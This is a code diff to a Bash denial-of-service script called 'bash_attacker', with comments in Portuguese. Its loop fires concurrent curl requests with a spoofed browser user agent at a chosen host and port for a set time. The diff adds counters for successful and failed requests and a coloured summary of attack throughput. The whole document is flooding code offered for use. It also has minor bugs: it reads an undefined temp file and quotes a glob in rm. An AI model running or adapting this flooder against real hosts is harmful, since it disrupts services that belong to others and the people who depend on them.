@@ -3,7 +3,7 @@
 # Nome: bash_attacker
 # Autor: Erik Castro
 # Data de Criação: 08/10/2024
-# Data de modificação: 11/10/2024
+# Data de modificação: 13/10/2024
 # Decription: Simples script de ataque de negação de
 # serviço.
 # Versão: 0.0.1-alpha
@@ -12,6 +12,7 @@
 # -----------
 # Versão 0.0.1-alpha: Código básico implementado.
 # Versão 0.3.1-alpha: Melhorias na requisição
+# Versão 0.4.0-alpha: Relatório Geral implementado.
 #
 # =====================================================
 # Licensa:
@@ -51,6 +52,16 @@ porta_alvo="80"
 threads_atual=1
 _total_req=0
 tempo_ataque=35
+temp_file_fa=$(mktemp)
+echo 0 > $temp_file_fa # inicializando temp fa
+temp_file_su=$(mktemp)
+echo 0 > $temp_file_su # inicializa tem su
+
+# limpa arquivos temporarios
+limpa_tmp(){
+    rm -f $temp_file_fa $temp_file_su $temp_total_req "*.lock"
+    [[ $? -eq "0" ]] && return 0 || return 1
+}
 
 # despeja uma mensagem para a saída de erro padrão com data e hora.
 msg_erro() {
@@ -102,7 +113,18 @@ exibe_hist() {
 requisitar() {
     local host=$1
     local port=$2
-    curl --silent --max-time 1 -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" "${host}:${port}"
+    local sucess=$(cat $temp_file_su)
+    local fail=$(cat $temp_file_fa)
+    local req=$(cat $temp_file_req)
+
+    curl --silent --max-time 1 -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0" "${host}:${port}" &>/dev/null
+    if [[ "$?" -eq "0" ]]; then
+	((sucess++))
+	echo $sucess >$temp_file_su
+    else
+	((fail++))
+	echo $fail >$temp_file_fa
+    fi
 }
 
 # Valida se ip é valido (IPv4)
@@ -151,7 +173,7 @@ progress_bar() {
     printf "["
     printf "${YELLOW}%0.s\u2588" $(seq 1 $done)    # Imprime os símbolos "#" (completado)
     printf "%0.s " $(seq 1 $left)    # Imprime os símbolos "-" (restante)
-    printf "${RESET}] %3d%% (%d/%d)\r" $progress $current $total  # Imprime a porcentagem e o progresso atual
+    printf "${RESET}] %3d%% (%d/%d)\r" $progress $current $total # imprime a barra de progresso.
 }
 
 # valida a entrada de paramêtros
@@ -213,12 +235,12 @@ ataque(){
     local host="$1"
     local port="$2"
     local t_ataque="$3"
-    local t_final="$((SECONDS+t_ataque))"
+    local t_final="$((SECONDS + t_ataque))"
 
     while [[ SECONDS -lt t_final  ]]; do 
        progress_bar $SECONDS 30 $t_final
 
-       requisitar $host $port  &
+       requisitar $host $port &
        ((_total_req++))
        ((controle++))
        if [[ "$controle" -ge "$threads_atual" ]]; then
@@ -226,6 +248,7 @@ ataque(){
 	  ((controle--))
        fi
     done
+    wait # Aguarda que todod terminem.
 }
 
 banner_fn() {
@@ -257,19 +280,46 @@ banner_fn() {
 }
 
 gerar_relatorio(){
-    echo "======================================"
-    echo "Total de Requisições: ${_total_req}"
-    echo "Tempo decorrido: ${tempo_ataque}"
-    echo "Media: $((_total_req / tempo_ataque)) req. por segundos"
-    echo "======================================"
+    local RED="\033[1;31m"
+    local GREEN="\033[1;32m"
+    local YELLOW="\033[1;33m"
+    local CYAN="\033[1;36m"
+    local RST="\033[0m"
+
+    local tempo_decorrido=$SECONDS
+    local total_falhas=$(cat $temp_file_fa)
+    local total_sucessos=$(cat $temp_file_su)
+
+    # Proteção contra divisão por zero
+    local media_req_por_seg="N/A"
+    local media_req_por_thread="N/A"
+
+    if [[ $tempo_decorrido -gt 0 ]]; then
+        media_req_por_seg=$(echo "scale=2; $_total_req / $tempo_decorrido" | bc)
+    fi
+
+    if [[ $threads_atual -gt 0 ]]; then
+        media_req_por_thread=$(echo "scale=2; $_total_req / $threads_atual" | bc)
+    fi
+
+    echo -e "${CYAN}======================================"
+    echo -e "${YELLOW}              RELATÓRIO               ${CYAN}"
+    echo -e "======================================${RST}"
+    echo -e "${GREEN}Total de Requisições: ${CYAN}${_total_req}${RST}"
+    echo -e "${RED}Requisições Falhas: ${CYAN}${total_falhas}${RST}"
+    echo -e "${GREEN}Requisições Bem Sucedidas: ${CYAN}${total_sucessos}${RST}"
+    echo -e "${YELLOW}Tempo Decorrido: ${CYAN}${tempo_decorrido} segundos${RST}"
+    echo -e "${YELLOW}Média de Requisições por Segundo: ${CYAN}${media_req_por_seg} req/s${RST}"
+    echo -e "${YELLOW}Média de Requisições por Thread: ${CYAN}${media_req_por_thread} req/thread${RST}"
+    echo -e "${CYAN}======================================${RST}"
 }
 
 main() {
     banner_fn
     menu_check $@ || exit 1 
     ataque $host_alvo $porta_alvo "$tempo_ataque"
-    wait # Aguarda que todod terminem.
     gerar_relatorio
+    limpa_tmp
     return 0
 }
 
